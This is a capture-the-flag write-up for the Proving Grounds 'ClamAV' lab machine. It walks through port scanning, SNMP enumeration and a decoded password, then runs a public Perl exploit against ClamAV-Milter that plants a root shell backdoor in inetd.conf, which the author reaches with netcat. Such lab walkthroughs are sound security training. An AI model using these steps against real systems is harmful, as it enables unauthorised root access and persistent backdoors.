---
title: "Proving Grounds - ClamAV"
categories: [CTF, Proving Grounds - Play]
tags: [EASY, Linux, SNMP, ClamAV-Milter]
mermaid: true
image: ../assets/img/provingrounds/oscp.png
---

ClamAV was an insightful box to explore exploitation techniques for services like ClamAV-Milter.

The process started with comprehensive information gathering, including a full port scan revealing various open ports. 

The HTTP enumeration led to identifying and decoding a binary message, providing a potential password. 

Enumeration of SNMP services helped identify the running ClamAV-Milter service. 

The exploitation phase involved searching for relevant exploits and utilizing a Perl script to create a backdoor by modifying the /etc/inetd.conf file, which enabled root shell access through a netcat connection on a specified port.

# Diagram

```mermaid
graph TD
    A[Information Gathering] -->|Port Scan| B[Enumeration]
    B --> C[HTTP 80]
    C --> |Find Binary Info| D[Decode Binary]
    B --> F[SNMP 199 & 25]
    F --> G[Identify ClamAV-Milter]
    G --> H[Exploit ClamAV-Milter] --> |Execute Perl Script| I[Root Shell]
```

## Information Gathering

`IP=192.168.184.42`  

### Port scan

---

- `nmap -sS -Pn -n -T4 --open $IP`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled.png)
    
- `nmap -sS -Pn -n -T4 --open -p- $IP` - new port 6000
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%201.png)
    
- `nmap -sVC -Pn -n -p 22,25,80,139,199,445,60000 $IP`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%202.png)
    

## Enumeration

### HTTP 80

---

- [http://192.168.184.42/](http://192.168.184.42/) → Info in binary. Also the title is called `Ph33r`, looks like an User.
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%203.png)
    
- translating binary - `ifyoudontpwnmeuran00b` -  Looks like an password
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%204.png)
    

- `feroxbuster -u http://$IP -k -C 404,403,500,502  --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php -t 100`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%205.png)
    


### SNMP 199 & 25

---

- `snmpwalk -c public -v1 $IP` - Nothing useful
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2012.png)
    
- `snmp-check $IP -c public`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2013.png)
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2015.png)
    
    

It’s running  **ClamAV-Milter**

```jsx
3782 runnable clamav-milter /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
```

## Exploitation

### ClamAV

---

Now searching for scripts for ClamAV-Milter

- `searchsploit ClamAV-Milter` → *Only in perl*
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2017.png)
    
- `cat 4761.pl`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2018.png)
    

This script exploits a vulnerability in Sendmail when used with ClamAV's milter to append a malicious command to `/etc/inetd.conf`, effectively creating a backdoor that grants root access via a shell on a specified TCP port (31337). The script then restarts the inetd service to activate the backdoor.

- `perl 4761.pl $IP`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2019.png)
    

- `nc $IP 31337
/bin/sh -i`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2020.png)
    

- `flag`
    
    ![Untitled](../assets/img/provingrounds/ClamAV/Untitled%2021.png)